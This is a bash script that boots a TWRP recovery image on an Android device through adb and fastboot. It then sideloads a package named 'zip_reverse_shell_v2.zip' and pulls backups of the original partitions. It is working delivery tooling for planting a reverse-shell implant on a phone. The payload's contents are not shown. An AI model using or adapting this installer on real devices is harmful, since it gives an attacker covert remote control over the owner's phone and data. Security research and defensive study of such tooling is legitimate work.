#!/bin/bash

wfr() {
	adb wait-for-recovery
}

wfs() {
	adb wait-for-sideload
}

TWRP_PATH=./twrp

BACKUP_PATH=backup_original_partitions
BUILD_PATH=../out

ZIP_INSTALL=zip_reverse_shell_v2.zip

pull_backups=1

if [ ! -f "$TWRP_PATH" ]; then
  echo "[-] TWRP not found at '$TWRP_PATH'. Exiting."
  exit 1
fi

if [ -d "$BACKUP_PATH" ]; then
	echo "[?] The 'backup_original_partitions' directory is already present."
    read -p "[?] Overwrite? (y/N) " answer
    if [ "$answer" != "y" ] && [ "$answer" != "Y" ] && [ "$answer" != "yes" ]; then
        echo "[+] Will not pull backups"
        pull_backups=0
    fi
fi

echo "[*] Rebooting into bootloader"
adb reboot bootloader || echo "[!] Please enter Fastboot manually. Usually by holding 'Volume-' and 'Power' until reboot"
echo "[*] Booting '$TWRP_PATH'"
fastboot boot $TWRP_PATH

#  Install
wfr && sleep 10 && adb shell twrp sideload || echo "[!] Please enter ADB sideload manually. Go to Advanced -> ADB sideload"
wfs && echo "[*] Running installer"
adb sideload "$BUILD_PATH/$ZIP_INSTALL" && echo "[+] Install complete"

if [[ $pull_backups == 1 ]]; then
  echo "[*] Pulling backups from '/tmp/backup_original_partitions'"
	wfr && adb pull "/tmp/backup_original_partitions" "$BACKUP_PATH"
	if [ $? -ne 0 ]; then
	  echo "[!] Warning: please pull backups manually. See prompt in ADB Sideload console."
	  exit 1
	else
	  echo "[+] Backups pulled to '$BACKUP_PATH'"
	fi
fi

echo "[*] Rebooting"
wfr && adb reboot
